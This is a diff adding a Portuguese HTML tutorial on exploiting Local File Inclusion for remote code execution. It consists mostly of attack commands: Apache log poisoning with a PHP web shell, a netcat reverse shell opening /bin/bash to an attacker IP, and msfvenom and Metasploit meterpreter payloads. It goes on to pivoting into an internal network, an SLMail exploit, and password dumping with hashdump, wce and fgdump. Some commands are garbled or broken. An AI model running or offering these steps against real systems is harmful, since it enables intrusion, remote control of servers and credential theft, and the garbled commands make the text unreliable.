@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LFI RCE</title>
+    <link rel="stylesheet" href="css/style.css">
+
+
+</head>
+
+<body>
+    <div class="container">
+        <h1>Introdução</h1>
+        <p>Quando um servidor está vulnerável à Inclusão de Arquivos Locais (LFI), isso pode permitir a inserção de um script PHP malicioso que possibilita a execução de comandos arbitrários no servidor. Esse tipo de vulnerabilidade é conhecido como Execução Remota de Código (RCE).</p>
+
+        <h2>Inserção do Script Malicioso</h2>
+        <p>Para explorar essa vulnerabilidade, podemos utilizar o Netcat para enviar o script PHP ao servidor, que o aceitará e o incluirá nos arquivos de logs.</p>
+
+        <div class="sub-section">
+            <h3>Passos para Inserir o Script no Arquivo de Log:</h3>
+            <ol>
+                <li><strong>Conexão com o Servidor:</strong></li>
+                <code>nc -v www.webhhh.com.br 80</code>
+                <li><strong>Envio do Script:</strong>
+                    <p>Após estabelecer a conexão, envie o seguinte script para o arquivo de log:</p>
+                    <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
+                    <p>Este script será inserido no arquivo de log e interpretado pelo servidor.</p>
+                </li>
+            </ol>
+        </div>
+
+        <h2>Visualização do Script Inserido no Log</h2>
+        <p>Podemos verificar se o script foi inserido corretamente no arquivo de log utilizando o comando:</p>
+        <pre>index.php?page=/../../var/log/apache2/access.log%00</pre>
+        <p>Isso nos permitirá visualizar o script dentro do registro de login.</p>
+
+        <h2>Execução de Comandos no Servidor</h2>
+        <p>Para executar comandos no servidor, basta fornecer os parâmetros corretos na URL, como no exemplo a seguir:</p>
+        <pre>index.php?cmd=ls -la&page=/../../var/log/apache2/access.log%00</pre>
+        <p>Isso retornará todos os arquivos do diretório atual do servidor.</p>
+
+        <h2>Conexão Reversa com Netcat</h2>
+        <p>Além disso, podemos estabelecer uma conexão reversa com o servidor utilizando o Netcat.</p>
+
+        <div class="sub-section">
+            <h3>Passos para Conexão Reversa:</h3>
+            <ol>
+                <li><strong>Iniciar Netcat no Terminal:</strong></li>
+                <code>nc -vnlp 443</code>
+                <li><strong>Enviar Comando para Estabelecer Conexão:</strong>
+                    <p>Na URL vulnerável, envie o seguinte comando:</p>
+                    <code>index.php?cmd=nc 198.1.1.1 443 -e/bin/bash&page=/../../var/log/apache2/access.log%00</code>
+                    <p>Isso abrirá uma sessão de shell no servidor para a máquina do atacante.</p>
+                </li>
+            </ol>
+        </div>
+
+        <h2>Criação de Shell Maliciosa</h2>
+        <p>Para uma abordagem mais sofisticada, podemos criar uma shell maliciosa usando o Metasploit.</p>
+
+        <h3>Gerar Shell Maliciosa:</h3>
+        <pre>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=186.236.110.228 lport=8443 -f elf &gt; shell</pre>
+        <p>Isso gera um binário chamado "shell" que estabelecerá uma conexão reversa com o Metasploit.</p>
+
+        <h3>Enviar Shell para o Servidor:</h3>
+        <p>Iniciar Escuta e Enviar Shell:</p>
+        <pre>nc -vnlp 443 &lt; shell</pre>
+        <code>index.php?cmd=nc 186.236.110.228 443 &gt; /var/www/shell&amp;page=/../../var/log/apache2/access.log%00</code>
+       <p>Após a conexão ser estabelecida o shell será enviado para o servidor no diretório /var/www/shell</p>
+        <p>Estabelecer Conexão com o sevidor para visualiar a shell:</p>
+        <pre>nc -vnlp 443</pre>
+        <code>index.php?cmd=nc 186.236.110.228 -e/bin/bash&page=/../../var/log/apache2/access.log%00</code>
+        <code>ls</code>
+
+        <h2>Acessando o Servidor com Metasploit</h2>
+        <p>Depois que a conexão é estabelecida, podemos utilizar o Metasploit para interagir com o servidor e executar comandos mais avançados.</p>
+
+        <h3>Iniciar Sessão com Metasploit:</h3>
+        <pre>
+service postgresql start
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 186.236.110.228
+set lport 8443
+exploit
+        </pre>
+        <h2>Executan a shell</h2>
+        <code>chmod 777 shell</code>
+        <code>.shell</code>
+
+        <h2>Técnica de Pivotamento</h2>
+        <p>Para explorar ainda mais a rede, podemos usar técnicas de pivotamento para acessar outras máquinas na rede interna do alvo.</p>
+
+        <h3>Pivotamento na Rede Local:</h3>
+        <p>Escolhendo o modulo para executar um proxy</p>
+        <pre>background</pre>
+
+        <p>Retorna todas as sessões</p>
+        <pre>sessions -l</pre>
+
+        <p>Estabelece conexão com a sessão 1</p>
+        <pre>sessions -i 1 </pre>
+
+        <p>Estabelece conexão com a sessão 1</p>
+        <pre>sessions -i 1 </pre> 
+
+        <p>Exibe todos os modulos</p>
+        <pre>run</pre>
+
+        <p>Mostra todas as interfaces de rede</p>
+        <pre>ifconfig</pre>
+
+        <p>Mostra a rota no servidor</p>
+        <pre>route</pre>
+
+        <p>Estabelecer Rota na Rede Local do Alvo:</p>
+        <pre>run autoroute -s 172.16.1.0/24</pre>
+
+        <p>O comando <code>run autoroute -p</code> é usado para exibir a rota do alvo.</p>
+        <p>Depois, executamos para podermos escolher um módulo para executar um proxy:</p>
+        <pre>
+background
+use auxiliary/server/socks4a
+show options
+run
+        </pre>
+        <p>Para modificar a porta do proxy, podemos editar o arquivo de configuração <code>/etc/proxychains.conf</code> usando um editor de texto, como o nano:</p>
+        <pre>nano /etc/proxychains.conf</pre>
+        <p>Escaneamento da Rede Local:</p>
+        <pre>proxychains nmap -v -sf --open --top-ports -Ṕn 172.16.1.0/24</pre>
+        <pre>proxychains nmap -v -sf --open -p 110 -Ṕn 172.16.1.0/24</pre>
+        <p>Suponhamos que tenhamos encontrado um computador na rede local com a porta 110 aberta. Podemos estabelecer uma conexão com esse computador utilizando o seguinte comando:</p>
+        <pre>portfwd add -l 110 -p -r 110 -r 172.16.1.4</pre>
+        <p>Este comando adiciona uma nova regra de redirecionamento de porta, que direciona o tráfego recebido na porta local 110 para a porta 110 no endereço IP remoto 172.16.1.4. Essa técnica é útil em cenários onde é necessário redirecionar o tráfego de entrada de uma porta local para uma porta específica em outro dispositivo na rede.</p>
+        <p>Quando executamos o comando abaixo, em vez de escanear nosso próprio computador, ele escaneará o IP local 172.16.1.4:</p>
+         <pre>nmap -v -sV -p 110 127.0.0.1</pre>
+         <p>Observe que passamos nosso IP local. No entanto, o Nmap escaneará o IP 172.16.1.4. Isso ocorre porque redirecionamos o tráfego recebido na porta 110 para a porta 110 do alvo, que é o IP 172.16.1.4.</p>
+         <p>O comando <code>search slmail</code> é usado no Metasploit para procurar um exploit específico para o serviço slmail.</p>
+
+
+        <h2>Ganhar Acesso a Estações de Trabalho</h2>
+        <p>Além de acessar o servidor, podemos explorar estações de trabalho na rede utilizando exploits específicos.</p>
+
+        <h3>Explorar Estação de Trabalho:</h3>
+        <pre>
+use exploit/windows/pop3/seattelab_pass
+set RHOST 172.16.1.4
+set payload windows/meterpreter/reverse_tcp
+set lport 110
+set lhost 186.236.110.228
+exploit
+        </pre>
+
+        <p>Esta técnica permite ganhar acesso a máquinas na rede e explorar suas vulnerabilidades.</p>
+         <p>O comando <code>show options</code> exibe as opções disponíveis para configuração antes de executar o exploit.</p>
+<p>O comando <code>exploit</code> inicia a execução do exploit com as opções configuradas.</p>
+<p>O comando <code>hashdump</code> é utilizado para extrair e exibir as senhas dos administradores do sistema.</p>
+
+<p>Os comandos:</p>
+<code>upload /usr/share/wce/wce-universal.exe c:/</code>
+<p>São usados para copiar arquivos específicos para o sistema alvo:</p>
+<p>Os comandos:</p>
+<code>upload /usr/share/windows-binaries/fgdump/fgdump.exe c:/</code>
+<p>São usados para copiar arquivos específicos para o sistema alvo:</p>
+<ul>
+    <li><code>wce-universal.exe</code> <p>é copiado para o diretório</p> <code>C:/</code>.</li>
+    <li><code>fgdump.exe</code> <p>É copiado para o diretório</p> <code>C:/</code>.</li>
+</ul>
+
+<p>Após a cópia dos arquivos, os seguintes comandos são executados:</p>
+<ul>
+    <li><code>shell</code>
+         <code>wce-universal.exe -w</code><p>É usado para executar o arquivo</p> <code>wce-universal.exe</code><p> com a opção:</p> <code>-w</code><p>, que pode ser usada para obter informações sobre as senhas do sistema.</p></li>
+    <li><code>fgdump.exe</code><p>É executado para extrair informações de senha do sistema.</p></li>
+</ul>
+
+<p>O comando <code>type pwdump.txt</code> é utilizado para exibir o conteúdo do arquivo <code>pwdump.txt</code>.</p>
+
+<p>Por fim, o comando <code>exit</code> é utilizado para sair do shell e retornar ao prompt do Metasploit.</p>
+
+
+        <h2>Conclusão</h2>
+        <p>Com as técnicas apresentadas, é possível explorar e comprometer sistemas em uma rede, destacando a importância da segurança cibernética e da proteção contra ataques maliciosos.</p>
+
+    </div>
+</body>
+
+</html>
